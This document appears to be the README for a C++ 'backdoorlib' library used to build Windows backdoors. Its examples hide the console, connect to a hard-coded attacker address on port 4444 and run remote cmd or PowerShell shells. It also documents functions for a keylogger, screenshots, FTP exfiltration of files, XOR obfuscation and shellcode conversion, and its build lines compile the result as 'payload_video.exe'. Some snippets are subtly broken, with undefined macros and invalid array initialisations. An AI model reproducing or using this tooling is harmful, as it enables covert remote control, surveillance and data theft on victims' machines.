Commands List

#### void hello_world(void)
##### this function displays "Hello World" in the console, does not return any value
```cpp
//compile : g++ backdoorlib.cpp test.cpp -o test.exe
#include "backdoorlib.h"
#include <iostream>
#include <windows.h>

int main()
{
    hello_world();
    return 0;
}
```

#### char * raw_input(char *input_string);
##### this function is an input for strings just like Python 2.7
##### return input_string value

```cpp
//compile : g++ backdoorlib.cpp test.cpp -o test.exe
#include "backdoorlib.h"
#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    char *ch = raw_input(">>");
    cout << ch << endl;
    return 0;
}
```

#### int input(char *input_string);
##### this function allows you to make an entry of an integer number
##### return input_integer

```cpp
//compile : g++ backdoorlib.cpp test.cpp -o test.exe
#include "backdoorlib.h"
#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    int ch = input(">>");
    cout << ch << endl;
    return 0;
}
```

#### void clear(void);
##### this function clears the console
##### does not return any value

```cpp
#include "backdoorlib.h"
#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    clear();
    int ch = input(">>");
    cout << ch << endl;
    return 0;
}
```

#### int substring_in_string(char *substring,char *string);
##### return 1 if true return 0 if false

```cpp
#include "backdoorlib.h"
#include <iostream>
#include <windows.h>

using namespace std;

int main()
{
    clear();
    char *substr[] = "hel";
    char *string[] = "hello";
    int cmp = substring_in_string(substr,string);
    if (cmp ==1)
    {
        cout << "'hel' its in 'hello'" << endl;
    } else {
        cout << "Error" << endl;
    }
    return 0;
}
```

#### int tchar_substring_in_string(char *substring,TCHAR *string);
##### same as the function said above


#### int StartsWith(const char *a, const char *b);
##### This Function verifies if the beginning of the character string starts with the selected character string.
##### return 1 if true return 0 if false

#### TCHAR *get_username()
##### This Function Return Username Of Session

#### void print(char *string)
##### This Function print String in Console

#### int check_dir(char *pathname)
##### This Function Return -1 if path not exists
##### return 1 if path is Dir
##### return 0 if path is file

#### void hide_console(void)
##### This Function Hide Console // FreeConsole();

#### void sleep(int seconds)
##### This Function Make Time Sleep

#### int connect(SOCKET socks_instance,struct sockaddr_in session)
##### This Function Connect To Host With SOCKET Object and sockaddr_in structure
##### return 0 if connected & return -1 if not connected

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  WSADATA wsa_version;
  SOCKET socks;

  struct sockaddr_in session;

  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  session.sin_family = AF_INET;
  session.sin_port = htons(REMOTE_PORT);

  WSAStartup(MAKEWORD(2,2),&wsa_version);
  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
  int c = connect(socks,session);
  if (c == 0)
  {
    send(socks,"Hello Server !");
  }
  return 0;
}
```

#### int send(SOCKET socks_instance,char *buffer)
##### This Function allows you to send data
##### return -1 if failed and return 0 if sent

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  WSADATA wsa_version;
  SOCKET socks;

  struct sockaddr_in session;

  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  session.sin_family = AF_INET;
  session.sin_port = htons(REMOTE_PORT);

  WSAStartup(MAKEWORD(2,2),&wsa_version);
  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
  int c = connect(socks,session);
  if (c == 0)
  {
    send(socks,"Hello Server !"); // return 0 if data sent else return -1;
  }
  return 0;
}
```
#### int recv(SOCKET socks_instance,char *buffer,int len)
##### This Function allows you to receive data and store it in a buffer.
##### return data if true else return 0 or -1 if not data

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  WSADATA wsa_version;
  SOCKET socks;

  struct sockaddr_in session;

  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  session.sin_family = AF_INET;
  session.sin_port = htons(REMOTE_PORT);

  WSAStartup(MAKEWORD(2,2),&wsa_version);
  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
  int c = connect(socks,session);
  if (c == 0)
  {
    char *buffer[4096];
    recv(socks,buffer,sizeof(buffer)); // return data if recv else return -1;
  }
  return 0;
}
```

#### void cmd_command(SOCKET socks_instance,char *command)
##### This Function allows you to send a command in the cmd.exe process.

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  WSADATA wsa_version;
  SOCKET socks;

  struct sockaddr_in session;

  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  session.sin_family = AF_INET;
  session.sin_port = htons(REMOTE_PORT);

  WSAStartup(MAKEWORD(2,2),&wsa_version);
  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
  int c = connect(socks,session);
  if (c == 0)
  {
    char *buffer[] = "dir";
    cmd_command(socks,buffer); // execute cmd_command and recv output
  }
  return 0;
}
```

#### void powershell_command(SOCKET socks_instance,char*command)
##### This function allows you to send a command in the powershell.exe process.

#### void wsl_command(SOCKET socks_instance,char *command)
##### This function allows you to send a command to the wsl.exe sub-system if present.

#### void execute_process(SOCKET socks_instance,char *process)
##### This function executes a process.

#### void execute_cmd(SOCKET socks_instance);
##### This Function executes cmd commands and returns the contents of the remote terminal by socket.

#### void execute_powershell(SOCKET socks_instance);
##### This Function executes powershell.exe and returns the contents of its contents remotely per socket.
```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  WSADATA wsa_version;
  SOCKET socks;

  struct sockaddr_in session;

  session.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
  session.sin_family = AF_INET;
  session.sin_port = htons(REMOTE_PORT);

  WSAStartup(MAKEWORD(2,2),&wsa_version);
  socks = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP,0,0,0);
  int c = connect(socks,session);
  if (c == 0)
  {
    execute_powershell(socks); // execute cmd_command and recv output
  }
  return 0;
}
```

#### int download_to_ftp(char* filename, char* ftp_host, int ftp_port,char *ftp_user,char *ftp_pass)
##### This function allows you to send a file to an ftp server.
##### Return 0 if sent else return -1

#### int cd(char *path)
##### This function allows you to change paths.
##### if true return 0 else return -1

#### int download_on_ftp(char* filename, char* ftp_host, int ftp_port, char* ftp_user, char* ftp_pass)
##### This function allows you to download a file from an ftp server.
##### return 0 if downloaded else return -1

#### int keylogger_spawn(string FILENAME_LOG)
##### launches a keylogger
##### return 0

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  keylogger_spawn("log.txt"); // spawn a keylogger and write KEY_LOG in log.txt
  return 0;
}
```

#### vector<string> split(const string& s, char delim)
##### allows to split a character string
##### return vector results

#### bool endswith(const std::string& str, const std::string& suffix)
##### if return code is 1 its True else if 0 its False

#### bool startswith(const std::string& str, const std::string& prefix)
##### if return code is 1 its True else if 0 its False


#### vector<int> GetScreenResolution(int &w, int &h)
##### Allows to recover the size of the screen
##### return results

#### bool screenshot(int x, int y, int w, int h, LPCSTR fname)
##### Take a ScreenShot and save as filename
##### if true return true if false return false

```cpp
//compile : g++ backdoorlib.cpp Payload.cpp -o payload_video.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -std=c++11 -lkernel32 -luser32 -lgdi32 -lwinspool -lwininet -lole32 -loleaut32 -luuid -Wconversion-null
#include "backdoorlib.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include <wininet.h>
#include <windows.h>

#pragma comment(lib,"Ws2_32.lib")

#define SERVER_ADDR "192.168.1.71"
#define SERVER_PORT 4444

int main()
{
  hide_console();
  screenshot(1920, 1080, 0, 0, (LPCSTR)"screenshot.jpg"); // take a screenshot
  return 0;
}
```

#### char *cmd_popen_char(const char *command,const char *mode,char *buffer)
##### This function allows you to execute a system command and retrieve the stdout or stderr output.
##### return buffer

#### string tohex(string buffer)
##### Allows you to convert a string into hexadecimal.
##### return hexa value

#### string xor_string_enc_dec(string data, char key[])
##### allows to encrypt a character string with a symmetric XOR key
##### return Xor Value

#### int xor_logic(int a,int b)
##### Xor Boolean Operations

#### bool bool_xor_logic(bool a, bool b)
##### Xor Boolean Operations

#### int getpid(const string& process_name)
##### allows to recover the pid of a process
##### return pid

#### string string_to_shellcode(string buffer);
##### return Hex Shellcode Format

#### string hex_to_shellcode(string buffer);
##### return hex to hex_execution Format

#### BOOL check_admin(void);
#### return 1 if administrator is True else return 0 if no administrator

#### string read_file(string filename,string buffer_return);
#### string read_file_binary(string filename,string buffer_return);
#### string read_file_to_hex(string filename,string buffer_return);
#### string read_file_binary_to_hex(string filename,string buffer_return);
#### void open_process(LPCSTR process,LPCSTR args,LPCSTR dir);
#### char *get_system_info_by_powershell(char* buffer, char* mode);
